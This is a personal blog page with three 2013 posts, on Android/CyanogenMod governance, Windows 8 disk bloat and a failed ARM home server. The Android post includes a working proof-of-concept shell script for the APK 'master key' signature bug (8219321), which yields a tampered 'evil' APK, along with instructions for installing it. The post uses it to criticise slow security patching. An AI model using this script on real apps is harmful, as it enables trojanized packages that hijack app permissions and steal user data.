
<!DOCTYPE html class="maskImage">
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Dario's coredump</title>
  <meta name="author" content="Dario Bertini">

  
  <meta name="description" content="Originally I wanted to write another post, akin to &ldquo;Cyanogenmod is a ghetto&rdquo;. In fact I wasn&rsquo;t really fond of that project and, &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://berdario.github.io">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Dario's coredump" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-41810607-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Dario's coredump</a></h1>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:berdario.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <!-- <li><a href="/">Blog</a></li> -->
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about/">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/12/24/let-down-by-googles-android/">Let Down by Google&#8217;s Android</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-24T23:56:00+01:00" pubdate data-updated="true">2013 December 24<span>th</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Originally I wanted to write another post, akin to &ldquo;Cyanogenmod is a ghetto&rdquo;. In fact I wasn&rsquo;t really fond of that project and, until now, with my android phone (a Nexus S) I chose to stick to the stock android version (I experienced cyanogenmod and others aftermarket mods with my previous phone: an HTC Dream, the very first android device).</p>

<p>I never really liked the xda-developers forums either: a lot of OSS projects have their own forum, but for development a Mailing List (or similar) is preferred. The advantages are obvious: you get to reuse your identity (email), you don&rsquo;t have to deal with wonky cookie-based session authentication, you don&rsquo;t have to deal with bulky signatures/animated gifs/etc. (as long as you don&rsquo;t render html and/or enforce the netiquette) and everyone keeps a copy of the old discussions (thus, if the server and its backup disks get corrupted you won&rsquo;t completely lose your project history).</p>

<p>In fact, at the beginning I remember developers complaining about the &ldquo;cooking&rdquo; mindset: building your homebrew android versions wasn&rsquo;t supposed to be like taking binaries and stuff them together without really knowing how the whole system worked (this was probably more common during the Windows Mobile 6 roms era). Most people on xda in fact were quite new to linux: I remember asking there (or in other places, like some irc channels) why the preferred filesystem for app2sd was ext2 instead of ext3/4&hellip; but the answer I got was just that journaling &ldquo;wasn&rsquo;t needed&rdquo; for a mobile device (nevermind the fact that even mobile devices can get turned off abruptly, or just think about the long check process that android does when it starts up to detect corruption on the sd/external memory). Needless to say: the conventional wisdom changed.</p>

<p>Maybe for the same reason, when I asked about a <a href="https://en.wikipedia.org/wiki/Vanilla_software">vanilla</a> Android rom I was told that there was no such thing as vanilla. At the time I thought that maybe it was just because there was indeed no such build available (but still, it seemed strange that no-one would take the AOSP sources and made it available as an image ready-to-install), but after I realized that it might have been quite likely that the very idea of a &ldquo;vanilla&rdquo; version, might have been foreign to them&hellip; unbeknownst of the dangers of balkanization for the several android roms that sprouted out.</p>

<p>Also, due to the fact that end-users (who never flashed a firmware before in their life) and developers hanged around in the same forums, I remember that people could get frustrated and hostile to the users at times. Unfortunately, digging up posts from the xda-dev and cyanogenmod forums before summer 2009 seems quite hard.</p>

<p>Another problem, was the <a href="http://android-developers.blogspot.it/2009/09/note-on-google-apps-for-android.html">handling of Google Apps</a>: imho it was obvious from the start that if someone is willingly licensing something to be used freely, the software that they haven&rsquo;t licensed so is probably important for them. But early modders probably didn&rsquo;t care, due to being accustomed of redistributing binaries in the old Windows Phone 6 days&hellip;</p>

<p>I kept using my HTC Dream until early 2012, and while it was painful to use due to the small amount of memory, it was still usable with Cyanogenmod5 (running Android 2.1 aka Eclair). With Cyanogenmod6 (Android 2.2) instead, even if it was <a href="https://github.com/CyanogenMod/android_vendor_cyanogen/blob/froyo/CHANGELOG.mkdn#maintainers">still supported by Cyanogen himself</a>, there were some changes among the system apps, like the new Gallery that (due to its additional animations and increased memory requirements) was totally unusable on the Dream. Other than this, there were also some nasty sudden reboots when using the camera (but it was probably to be expected, since the camera firmware has almost never been open). This left me with a bitter taste, and I was not so sure anymore that the Cyanogenmod they shipped was actually used and tested day-to-day by the developers (not for the older models, at least).</p>

<p>Between an up-to-date device that&rsquo;s so slow as to be unusable, and a device that&rsquo;s some versions behind, I chose to just use the latter. Up until then, I coveted the latest Android version, but let&rsquo;s look at the facts: There were some truly important and interesting improvements with the earlier versions:</p>

<ul>
<li>1.5 3rd party keyboards, widgets, better bluetooth, copypaste in the browser, animations, autorotation, etc.</li>
<li>1.6 Search (also with voice) through contacts and more, TTS, camera improvements&hellip;</li>
<li>2.0 Multiple accounts sync, browser improvements, live wallpapers, etc.</li>
<li>2.2 JIT, USB &amp; Wi-fi tethering, Market batch updates, native app2sd, etc.</li>
</ul>


<p>But with the latest versions, I don&rsquo;t feel such a need for the new features. I&rsquo;m not saying that changes in the later Android version aren&rsquo;t interesting, for example I appreciated the multiple user accounts support in 4.2 and 4.3. But if you weren&rsquo;t an Android user before 2.2, just try to imagine how it would&rsquo;ve been not to be able to update all the dozen (or more!) of applications that requested an update&hellip; Or to resort to rooting just to get tethering or app2sd working.</p>

<p>In the meanwhile, though I didn&rsquo;t &ldquo;need&rdquo; Cyanogenmod anymore, it has improved: the controversial idea of rooting your device <a href="http://www.cyanogenmod.org/blog/security-and-you">has been reevaluated</a> (is subverting the android security model a good idea? <a href="https://github.com/ChainsDD/Superuser/">&ldquo;How does the SU app really work?&rdquo;</a> I find it slightly worrying that there&rsquo;s no wiki on the official project and aside from stackoverflow.com it&rsquo;s difficult to find information on it)</p>

<p>I&rsquo;ve also heard that they&rsquo;re planning to fix the <a href="https://android-review.googlesource.com/22694">building keys detail</a> and the Cyanogenmod Inc. project (aside from <a href="https://plus.google.com/+GuillaumeLesniak/posts/L8FJkrcahPs">some brouhaha</a> ) seems like good news.</p>

<p>So, I&rsquo;m not a fan of Cyanogenmod (though I&rsquo;ll go back to using it now, probably), but here I actually wanted to talk about what disappointed me with Google&rsquo;s Android management recently:</p>

<p>To better understand the issue, you might want to have a look at <a href="http://nelenkov.blogspot.de/2013/05/code-signing-in-androids-security-model.html">this explanation of the Android security model</a>. Briefly: Apk signatures are checked with a TOFU (Trust On First Use) model and there is no centralized CA model.</p>

<p><a href="https://www.codeaurora.org/cgit/quic/la/platform/libcore/commit/?h=jb_2.5.6&amp;id=c5af994b579b404cb0e501e7e20b5427493d66f7">13th of February 2013 a fix was pushed</a> to an internal Google repository. <a href="http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/">The issue it fixed was not publicly known until early July</a>, but as of 11th of July Google still didn&rsquo;t merge the patch into the AOSP.</p>

<p>You&rsquo;ll notice that the first link isn&rsquo;t from AOSP: I got the link by asking on the Cyanogenmod irc channel, and that is where Cyanogen got the patch from (it probably was just by luck that this commit was publicly available). That was subsequently <a href="https://jira.cyanogenmod.org/browse/CYAN-1602">merged into Cyanogenmod 10.1</a>.</p>

<p>This irks me already: Google receive news of a security vulnerability and has a solution for it, but decides to sit on it for 5 months? You&rsquo;d think that the wait serves for 3rd parties to have time to integrate it into their Android builds, test it and ship it; but as far as we know, OEMs aren&rsquo;t backporting security fixes from Google&rsquo;s internal repository. In fact the fix has been integrated only in devices that run at least Android 4.3.</p>

<p>But the latest supported version for my Nexus S is Android 4.1, 32 months passed since the Nexus S launch, am I already at risk of widely known exploits for an unpatched bug? (Actually it&rsquo;s even worse: the latest update shipped October 2012, less than 2 years since the device launch)</p>

<p>Google would like for us to think otherwise <a href="http://arstechnica.com/security/2013/07/google-patches-critical-android-threat-as-working-exploit-is-unleashed/">[1]</a> <a href="http://arstechnica.com/security/2013/08/researchers-find-trojanized-banking-app-that-exploits-critical-android-bug/">[2]</a>. Sure they can fix part of the issue server side on the Play Store, but what about Android at-large? What about apps installed outside the market? They&rsquo;re more common than you might think: just realize that some devices don&rsquo;t ship with the Google Apps and that several alternative stores exists (F-Droid, Amazon&rsquo;s, even the Humble Bundle App works as an app store even if you cannot buy directly from it). The cornerstone for bringing relief to otherwise unsupported devices seems to be the Google Verification Tool.</p>

<p><strong>Edit:</strong> <em>I tried again, and now the Verification Tool is able to recognize this exploit. Needless to say, when I prepared my notes for this post some time ago it wasn&rsquo;t, and my point still stands.</em></p>

<p><strike>Unfortunately, it doesn&rsquo;t protect from this security hole at all. I have no clue why is that, but it&rsquo;s quite easy to reproduce: You just have to take an android package, decompile it and repackage it like <a href="http://blog.apkudo.com/2012/10/16/reverse-engineering-android-disassembling-hello-world/">this post</a> instructs you to do (it even has a link to an already-built HelloWorld apk, so you don&rsquo;t even have to write Java code to test it) and instead of rebuilding the apk straight away, follow the instructions as laid out in this <a href="https://gist.github.com/poliva/36b0795ab79ad6f14fd8">POC shell script</a> (or just execute it): </strike></p>

<figure class='code'><figcaption><span> (android-apk-poc.sh)</span> <a href='/downloads/code/android-apk-poc.sh'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'><span class="c"># PoC for Android bug 8219321 by @pof</span>
</span><span class='line'><span class="c"># +info: https://jira.cyanogenmod.org/browse/CYAN-1602</span>
</span><span class='line'><span class="k">if</span> <span class="o">[</span> -z <span class="nv">$1</span> <span class="o">]</span>; <span class="k">then </span><span class="nb">echo</span> <span class="s2">&quot;Usage: $0 &lt;file.apk&gt;&quot;</span> ; <span class="nb">exit </span>1 ; <span class="k">fi</span>
</span><span class='line'><span class="nv">APK</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'>rm -r out out.apk tmp 2&gt;/dev/null
</span><span class='line'>java -jar apktool.jar d <span class="nv">$APK</span> out
</span><span class='line'><span class="c">#apktool d $APK out</span>
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Modify files, when done type &#39;exit&#39;&quot;</span>
</span><span class='line'><span class="nb">cd </span>out
</span><span class='line'>bash
</span><span class='line'><span class="nb">cd</span> ..
</span><span class='line'>java -jar apktool.jar b out out.apk
</span><span class='line'><span class="c">#apktool b out out.apk</span>
</span><span class='line'>mkdir tmp
</span><span class='line'><span class="nb">cd </span>tmp/
</span><span class='line'>unzip ../<span class="nv">$APK</span>
</span><span class='line'>mv ../out.apk .
</span><span class='line'>cat &gt;poc.py <span class="s">&lt;&lt;-EOF</span>
</span><span class='line'><span class="s">#!/usr/bin/python</span>
</span><span class='line'><span class="s">import zipfile </span>
</span><span class='line'><span class="s">import sys</span>
</span><span class='line'><span class="s">z = zipfile.ZipFile(sys.argv[1], &quot;a&quot;)</span>
</span><span class='line'><span class="s">z.write(sys.argv[2])</span>
</span><span class='line'><span class="s">z.close()</span>
</span><span class='line'><span class="s">EOF</span>
</span><span class='line'>chmod 755 poc.py
</span><span class='line'><span class="k">for </span>f in <span class="sb">`</span>find . -type f |egrep -v <span class="s2">&quot;(poc.py|out.apk)&quot;</span><span class="sb">`</span> ; <span class="k">do</span> ./poc.py out.apk <span class="s2">&quot;$f&quot;</span> ; <span class="k">done</span>
</span><span class='line'>cp out.apk ../evil-<span class="nv">$APK</span>
</span><span class='line'><span class="nb">cd</span> ..
</span><span class='line'>rm -rf tmp out
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Modified APK: evil-$APK&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strike>Then, make sure that the Google Verification Tool is enabled (before 4.2 you have to open a separate application called Google Settings, you&rsquo;ll find a checkbox under Verify Apps) and you should find that your hacked apk installs just fine. (Actually, I got GVT to error on me when trying to install legitimate packages from F-Droid, so I&rsquo;m really skeptical about its real-world usefulness)</p>

<p>You should&rsquo;ve already realized it by now, but it might be worth repeating: this would permit an attacker to silently reuse permission granted to a legitimate application, or steal data that was stored by it, without the user being the wiser.</strike></p>

<p>This is the last straw that made me wary of Google management, but it&rsquo;s not the first time I&rsquo;ve been dissatisfied by it: <a href="http://arstechnica.com/gadgets/2013/10/googles-iron-grip-on-android-controlling-open-source-by-any-means-necessary/">this article</a> clearly exposes the problem:
Replacing open source applications with closed source ones. I felt it especially with the transition to Hangouts: it made it impossible to message your contacts on federated XMPP servers, it superseded GTalk which was mostly open source afaik and it broke Hangouts inside the G+ app if you tried to downgrade it to GTalk. Along with GTalk, the Search app, Music, Calendar, Keyboard, among others have been superseded by their closed-source equivalent.</p>

<p>Sure, the code of the old app is still available (it&rsquo;s what <a href="https://chatsecure.org/">ChatSecure</a> has been built on if I&rsquo;m not mistaken), but if nobody is using and developing the code it&rsquo;ll likely bitrot. Also it won&rsquo;t be featured anymore on the builds that have represented the true stock Android experience until now: the builds that were shipped on Nexus devices that is.</p>

<p>Slowly it&rsquo;s hijacking the perception of what actually Android is. A true vanilla AOSP build without Google apps might soon be unusable for someone trained on Google devices.</p>

<p>So, Android is Open Source, and I&rsquo;m grateful for that&hellip; I&rsquo;ve always thought that the critiques of the Google Code dump releases as not being truly-open were quite shallow, given that the competition was much worse (that is, not open source at all, no sideloading of apps, not Linux friendly, no freely available developer tools). I certainly wished for a more open engagement with the community, but it seemed good enough.</p>

<p>I don&rsquo;t know if the open source contenders (Ubuntu phone, Jolla Sailfish and FirefoxOS) will succeed, and I realize that the security updates mismanagement that I&rsquo;m blaming Google for can actually have some partial explanations with the way that software deploy is done on such devices.</p>

<p>(I talked recently with developers for Ubuntu phone, and they told me that the idea of shipping a huge image that contains both feature updates and security updates, and doing it &ldquo;late&rdquo; is due to user experience and usability requirements: testing is paramount and users don&rsquo;t want to apply system updates too often&hellip; I&rsquo;m not 100% persuaded, but surely it&rsquo;s a case for having an as-smallest-as-possible core system)</p>

<p>But if we actually have some freedom in this mobile platform, we have to exercise it. We have to test where the boundaries are and realize where they are. Has Google an unfair competitive advantage with the Google Apps licensing? Given the proprietary model, even if it has not, it&rsquo;s possible in the future for them to make it so. Do you even have <a href="https://en.wikipedia.org/wiki/The_Free_Software_Definition#The_definition">Freedom 0</a> if Google doesn&rsquo;t allow the redistribution of the Google apps? (I&rsquo;m using the FSF idea of freedom: I don&rsquo;t completely agree with Richard Stallman, but I find his definition of software freedom useful for bringing forth discussion)</p>

<p>Using Android without Google apps (thus without even the Play store or the APIs) would make it clear when to get your work done you have to go through proprietary software, and force you into a platform that you couldn&rsquo;t  build/recreate yourself. If only as an experiment, I think I&rsquo;ll try it soon, but it&rsquo;s obvious how avoiding the use of the market can be troublesome.</p>

<p>In fact, even some very OSS-friendly developers and applications <a href="https://github.com/WhisperSystems/TextSecure/issues/127">don&rsquo;t ship outside the Play store</a> (but luckily <a href="http://www.cyanogenmod.org/blog/whisperpush-secure-messaging-integration">Cyanogenmod will bundle this particular application</a>). The reasons are somewhat complex: Moxie objects to the key handling of the F-Droid project and the requirement for enabling 3rd party sources, but it seems that the main reason that is blocking that bug is guaranteeing updates and having crash reporting (which could be solved from inside TextSecure).</p>

<p>While on the front of removing the sideloading requirement, an <a href="https://gitorious.org/f-droid/fdroidclient/merge_requests/37">effort is currently underway</a> to get F-Droid running as a system app (possible when rooting or bundling it into your image), thus hopefully the future for a truly open Android is not so bleak.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/12/11/windows-disk-woes/">Windows Disk Woes</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-11T12:16:00+01:00" pubdate data-updated="true">2013 December 11<span>th</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Another six months passed since the last post: if you look at <a href="https://github.com/berdario/berdario.github.com/tree/source">the sources</a> you&rsquo;ll see that I&rsquo;ve dabbled with a rewrite of the javascript sources to clojurescript, so due to this overhaul (that I haven&rsquo;t even completed) I postponed writing once again &ndash;_&ndash;</p>

<p>Anyhow, this is another small rant: as I wrote last time, the home&rsquo;s desktop runs Windows (8, nowadays) on a 30GB SSD&hellip; I have a second traditional HDD that stores games, user folders, and bigger programs. The SSD only stores the core system and some small and core programs, but this summer the situation turned out to be unbearable:</p>

<p><img src="/images/windisk/windisk1.png" title="windirstat screenshot" ></p>

<p>(If you want to read easily the screenshot, just open it in a new tab)</p>

<p>The Windows folder started to require 23.5 GB all for its own (Yes, excluding all the things in Program Files), and the cleanup utility was unable to find anything more than 8MB worth of files to clean up.</p>

<p>So, by looking up manually I realized that old MSIs could&rsquo;ve been <a href="http://blogs.msdn.com/b/heaths/archive/2007/01/17/the-patch-cache-and-freeing-space.aspx">wasting some of that space</a> inside <code>C:\WINDOWS\Installer\$PatchCache$</code></p>

<p><img src="/images/windisk/windisk2.png" title="windirstat screenshot with PatchCache selected" ></p>

<p>As you can see, the footprint of my programs is quite lightweight (VS and the win SDK take up most of the space)</p>

<p><img src="/images/windisk/windisk4.png" title="windirstat screenshot with ProgramFilesx86 selected" ></p>

<p>But inside the 64bit ProgramFiles, there was nasty surprise waiting:</p>

<p>A lot of space was being used up by Windows8 apps: not only you can&rsquo;t easily access their folder inside <code>%ProgramFiles%</code> without changing permissions&hellip;</p>

<p><img src="/images/windisk/windisk3.png" title="windirstat screenshot with windows8 apps folder selected" ></p>

<p>But on top of that, the Uninstall Programs dialog completely ignores these apps footprint:</p>

<p><img src="/images/windisk/windisk5.png" title="windirstat screenshot with uninstall program dialog" ></p>

<p>To make this even worse, if you look at the contents, you&rsquo;ll see that there&rsquo;s some duplication: XboxLIVEGames, at least 3 copies of ZuneMusic, etc.</p>

<p>Apparently Windows8 &ldquo;helpfully&rdquo; stores old versions of all your metro apps, doesn&rsquo;t let you see the disk footprint of these, doesn&rsquo;t let you change the installation folder and doesn&rsquo;t even give you an easy to access way to purge these old programs from the system.</p>

<p>(Things might have changed in the meanwhile, especially with the release of 8.1, but as you can guess, updating to 8.1 when Windows leaves so few disk space available is not really feasible: all Windows version upgrade usually cannot use a second disk as cache for the files to be installed, thus it requires at least twice the disk space that will be used for the installed system)</p>

<p>Oh, well&hellip; time to change that 30 GB SSD :/</p>

<p>(Just a small note, in case I or someone else might need to compress the palette used by screenshots like these: I tried out optipng, pngnq, pngquant and pngcrush comparing the size of the output files and pngnq seems to yield the best results -together with pngquant, if I remember correctly-)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/06/17/back-to-sanity/">Back to Sanity</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T22:15:00+02:00" pubdate data-updated="true">2013 June 17<span>th</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>A lot of time passed since my last post&hellip; In fact it has been almost precisely a year since when I tried to write my 3rd blog post, but to my dismay I realized that the connection to the db failed.</p>

<p>So, it was June 2012 at the time&hellip; 3 months passed since the previous post, and I decided to start learning F#, I attended some courses at the university and passed 2 more exams (I wanted to use F# for the OpenGL course, but at the end I procrastinated too much).</p>

<p>Some other things happened as well, among them: the passing of my longest lived cat, Lady.</p>

<p><img class="right" src="/images/lady.png" width="300" title="&#34;my cat's obituary&#34;" alt="&#34;my cat's obituary&#34;"></p>

<p>It was quite sad, she had to be put down after a tumor grow back after surgery (she went under the knives 2 times) and the vet thought that we should&rsquo;ve spared her the last days: she was barely moving on the bed (but she was still willing to eat: I deluded myself into thinking that this meant she was still feeling somewhat alright).</p>

<p>It was the first time I witnessed the death of something I could relate to, but my reaction was totally silent and composed. I don&rsquo;t think of myself as someone very emotional or attached to other living beings.</p>

<p>Still, it makes you wonder about <em>lives after death</em>, not the supernatural ones&hellip; but the lives of those who outlive you.</p>

<p><em>How do they remember you?</em></p>

<p><em>Did your life mattered? Now that you disappeared what has changed?</em></p>

<p>More than one year later, we still have our cat litter in the same place where Lady was using it: it&rsquo;s not that we&rsquo;re paying respect or anything, we&rsquo;re just quite sloppy and slow to get rid of useless things&hellip; still, it&rsquo;s something that prompts me to think again of what I&rsquo;m missing.</p>

<p>Ok, so why didn&rsquo;t I write this before? What happened last June?</p>

<p>Well, I already mentioned that I had some problems with the hardware&hellip; just look at this picture:</p>

<p><img class="center" src="/images/sheevaplug.jpg" width="300" title="&#34;my sheevaplug crazy wiring&#34;" alt="&#34;my sheevaplug crazy wiring&#34;"></p>

<p>Basically, the first pin, the one that actually powers the cable, was nonfunctional in the sheevaplug I got&hellip; just to get it to run an usb key, I had to make that weird loop through an usb hub.</p>

<p>Obviously, at the time, I tried to contact GlobalScale&rsquo;s tech support, but I was only able to make a brief call through skype&hellip; their only email address available was the sales one, and I got no response from that.</p>

<p>Lesson learned: if you buy consumer goods overseas, don&rsquo;t expect much support, if the good is worth more than they&rsquo;re willing to blindly reship at the first customer complaint (I bought some videogames that, after being lost mid-voyage, the seller had no problem to send them again -successfully, this time- ).</p>

<p>On top of that, the sheevaplug has an armv5 cpu, and it shipped with a beta version of Ubuntu 9.04&hellip; though luck: Ubuntu supported only armv6 or greater with Ubuntu 9.10, and with 10.04 it moved the goalpost even further to armv7.</p>

<p>So, to hope to get any security updates for any meaningful length of time, without going to an even less familiar land, the best choice was Debian 6, Squeeze&hellip; obviously, to install an alternate os I had to <a href="https://www.google.com/search?hl=en&amp;q=sheevaplug+uboot">update the builtin bootloader: U-boot</a>.</p>

<p>To further complicate my life, at the time I tasted the almost-effortless (but not perfect) experience of Time Machine backups on MacOSX, and so I wanted to replicate the same thing, both for my Linux system and for my MacOSX partition (which I got rid of since then, due to having space as a premium on an SSD). To do it I had to use <a href="http://netatalk.sourceforge.net/">Netatalk</a> but at the time there were no precompiled ARM debian packages for it&hellip; I tried both to crosscompile it and to compile it directly on the sheevaplug, long story short: it was too much of an hassle.</p>

<p>The plan was to use it as network share (also for backups), local apt mirror, Squid proxy, web server, ssh tunnel, etc&hellip; Except for the Netatalk sharing (for linux I was satisfied with NFS) and the Squid proxy, I got all of this working; but the script I used to sync the apt mirror was failing often and I wasn&rsquo;t using that many machines contemporarily to warrant its use. Moreover the lan backup was weirdly taking too much time (the software I was using probably assumed RTT of a local disk, not a network one).</p>

<p>At the end, due to these shortcomings, I never really made use of the 3 different lvm logical volumes I had on the sheevaplug, now I hear you saying:</p>

<p><em>What? LVM on a sheevaplug?</em></p>

<p>Well, yes&hellip; it was also a learning exercise after all, and it seemed nice to use volumes like these instead of some other quota mechanism&hellip; then again, the only physical volume resided on an external usb hard drive, so don&rsquo;t think too much about it. :P</p>

<p>So, the technical problem I got was that the lvm volumes weren&rsquo;t being mounted anymore, and I had to manually remount them each time (possibly by resetting the device, since I kept lots of system files, like the ones in /usr/share, on the usb drive)&hellip; The drive and the lvm volumes alone seemed to be ok, since I could keep them mounted undefinitely on my desktop machine: A posteriori, this might have made me doubt about some other problems with the arm box (memory? usb?).</p>

<p>So, I finally managed to get my still-unstyled blog application online with the Cherokee web server and the Postgresql db. I planned to use sqlite at the beginning, due to the very small audience, but I couldn&rsquo;t run wsgi with a single worker, and multiple workers were incompatible with sqlite. But then I had to move all the data from the usb drive to a smallish (2GB) usb flash memory.</p>

<p>This was almost all fine and dandy, except that I never managed to get Cherokee and Postgres (upon which the workers depended) to automatically start at boot time, and weirdly there was absolutely no error on the logs&hellip; But given that I wasn&rsquo;t rebooting it that much often, I just ignored it, until&hellip;</p>

<p>The problem I mentioned at the beginning happened: now I couldn&rsquo;t start Postgresql anymore&hellip; this meant I couldn&rsquo;t even use pg_dump for the backup.</p>

<p>I resorted to manually backup the cluster files, and then I tried to purge and reinstall the package, but apt-get kept failing&hellip; I don&rsquo;t know if it was again a systemic problem or if instead it was a <a href="https://bugs.launchpad.net/ubuntu/+source/postgresql-8.3/+bug/235379/comments/15">known problem with the debian postgresql packaging</a>, but I was wary of running the fix of &ldquo;find and delete everything postgre-related&rdquo; since I wasn&rsquo;t able to recover my data just yet&hellip;</p>

<p>To make things worse: when I finally managed to get a postgresql install loaded with the cluster from the sheevaplug on my desktop machine, I sadly realized that it wasn&rsquo;t compatible: it was compiled with different float optimization, and basically an x86 db, x64 or arm db are all mutually incompatible with each other due to that. Now that I&rsquo;ve done a bit more coding with binary files, I&rsquo;m a little bit skeptical about the technical reasons underlying that incompatibility: Just look at Python&rsquo;s <a href="http://docs.python.org/3/library/struct.html">struct module</a>, the only way you can get something that is platform dependent, is if you ignore all the flags that let you specify the endiannes of the data, and if instead you roll with the native choice&hellip; It seems to me almost like that somewhere in the Postgresql code, there&rsquo;s a struct that&rsquo;s mapped directly to disk; but obviously it won&rsquo;t be this easy, I expect that code to have several layers of abstraction.</p>

<p>So, I got stuck with a non-working postgresql install, a possibly flaky hardware, a backup I couldn&rsquo;t access and a half-finished blogging software&hellip; no wonder that I wasn&rsquo;t feeling motivated to get back to blogging.</p>

<p>At the end, I realized that the very blog software I started writing, while a learning experience, was also not really what I wanted to do: what I wanted to do was to make something that other people could appreciate and use, and without any other people to motivate me to finish it, it just languished.</p>

<p>In fact, I failed to keep plain-text backups of my blog content, I added code to handle diffs between one post and another, I added OpenID login for the admin interface&hellip; I was basically rebuilding something that I could&rsquo;ve got for free by using a VCS and ssh access, just like what&rsquo;s being used by the several static site generators available on the net.</p>

<p>And then there&rsquo;re the obvious benefits of static sites: negligible server load, and a lot less moving parts that can possibly go awry&hellip; more frugal and ecologic even :) I already planned to avoid handling comments on my own with my blog software, so relying on Disqus or similar services wasn&rsquo;t even a problem.</p>

<p>With that said: yesterday I whipped up Qemu, created an ARM debian box, sweared a bit at some other unintuitive postgresql errors, and finally got my data back&hellip; and Now I finally started blogging again, this time as an <a href="http://octopress.org/">Octopress</a> blog running on github pages.</p>

<p>It isn&rsquo;t perfect, and I already witnessed a small problem that seems undocumented: markdown files with spaces in the name break the hyperlinking. But overall I&rsquo;m satisfied with moving to a simpler, more popular, and -ultimately- saner solution :)</p>

<p>So, where does this leave me? In this last year a lot of small things happened, but I&rsquo;m still not in the place that I want to be&hellip; but limiting myself with the bigger topic of this post, among the consequences of such an ordeal, I now grok better this <a href="https://news.ycombinator.com/item?id=5691216">nugget of wisdom</a>.</p>

<p>In fact, I think that I should refrain from pursuing projects, if those aren&rsquo;t truly needed by other people, and if those people aren&rsquo;t around to motivate me to work on them. I should focus more, and to do that, one obvious approach is to start learning less of the random things that I stumble upon almost daily.</p>

<p>Another thing, is a small and healthy distaste for arm machines. I mean: I have an arm smartphone, they can indeed be more power efficient, and they apparently got most of the mobile market&hellip; but if you&rsquo;re thinking of buying one for your personal use, you should ask yourself: <em>Do I really need it?</em></p>

<p>If you&rsquo;re building a company on top of that hardware, by all means: go for it. But otherwise, I can&rsquo;t avoid but think that I could&rsquo;ve spared myself many hassles by developing my small home server on a simple x86 box, maybe a small netbook (it isn&rsquo;t easy to get a cheap and small enclosure + microitx box from what I&rsquo;ve seen)&hellip; that could&rsquo;ve been much more reliable than my sheevaplug, while slightly more power consuming (and it would&rsquo;ve even been easier to use locally, since I could&rsquo;ve avoided the flaky usb debug port to be used through screen).</p>

